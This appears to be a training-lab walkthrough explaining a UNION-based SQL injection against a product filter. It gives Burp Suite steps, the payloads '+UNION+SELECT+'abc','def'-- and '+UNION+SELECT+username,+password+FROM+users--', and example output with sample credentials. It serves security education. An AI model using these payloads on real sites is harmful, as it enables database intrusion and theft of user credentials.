## Objective

Goal is to:

1. Determine the number of columns returned by the original query.
2. Identify which columns support text.
3. Retrieve usernames and passwords from the `users` table.

---

# Step 1: Intercept the Request

1. Open **Burp Suite**.
2. Turn **Intercept ON**.
3. Browse to the vulnerable lab.
4. Click any product category (for example, **Tech gifts**).
5. Burp captures a request similar to:

```
GET /filter?category=Tech+gifts HTTP/2
Host: lab-id.web-security-academy.net
```

Send it to **Repeater** (`Ctrl + R`).

---

# Step 2: Verify the Number of Columns

Inject the following payload into the `category` parameter:

```sql
'+UNION+SELECT+'abc','def'--
```

The SQL becomes similar to:

```sql
SELECT name, description
FROM products
WHERE category='Tech gifts'

UNION

SELECT
'abc',
'def'
```

### Why does this work?

Suppose the original query returns:

```sql
SELECT
name,
description
```

It has **2 columns**, both of which store text.

Your injected query also returns:

```sql
SELECT
'abc',
'def'
```

Again, **2 text columns**.

Since both the **number of columns** and their **data types** match, the `UNION` succeeds.

If you see **abc** and **def** on the page, you've confirmed:

- ✅ The query returns **2 columns**.
- ✅ Both columns accept **text** values.

---

# Step 3: Retrieve Data from the `users` Table

Now replace the test strings with the actual column names:

```sql
'+UNION+SELECT+username,+password+FROM+users--
```

This produces SQL similar to:

```sql
SELECT
name,
description
FROM products
WHERE category='Tech gifts'

UNION

SELECT
username,
password
FROM users
```

---

# How Does This Work?

The database executes **two queries**:

### Original Query

```sql
SELECT
name,
description
FROM products
WHERE category='Tech gifts'
```

Example result:

| name | description |
| --- | --- |
| Phone | Samsung Phone |
| Laptop | Gaming Laptop |

---

### Injected Query

```sql
SELECT
username,
password
FROM users
```

Suppose the `users` table contains:

| username | password |
| --- | --- |
| administrator | x9r7kLm2 |
| carlos | hello123 |
| peter | football |

---

### UNION Combines Both Result Sets

| Column 1 | Column 2 |
| --- | --- |
| Phone | Samsung Phone |
| Laptop | Gaming Laptop |
| administrator | x9r7kLm2 |
| carlos | hello123 |
| peter | football |

The web application displays all returned rows, so the usernames and passwords appear mixed in with the product data.

---

# Why Does This Work?

A `UNION SELECT` succeeds only when:

- The original query and injected query return the **same number of columns**.
- The corresponding columns have **compatible data types**.

In this lab:

| Original Query | Injected Query |
| --- | --- |
| `name` (text) | `username` (text) |
| `description` (text) | `password` (text) |

Everything matches, so Oracle (or the underlying database) can combine the results.
